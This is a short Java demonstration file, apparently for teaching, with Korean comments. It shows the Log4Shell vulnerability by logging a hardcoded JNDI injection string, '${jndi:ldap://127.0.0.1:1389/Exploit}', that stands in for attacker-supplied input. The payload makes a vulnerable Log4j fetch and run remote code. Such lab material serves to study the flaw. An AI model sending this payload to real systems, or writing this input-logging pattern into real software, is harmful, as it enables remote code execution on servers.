import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) {
        // 실제 환경에서는 외부 입력값(HTTP Request 등)이 들어오는 부분입니다.
        String userInput = "${jndi:ldap://127.0.0.1:1389/Exploit}";
        
        // 입력값을 그대로 로깅할 때 취약점이 트리거됩니다.
        logger.error("User input: {}", userInput);
    }
}
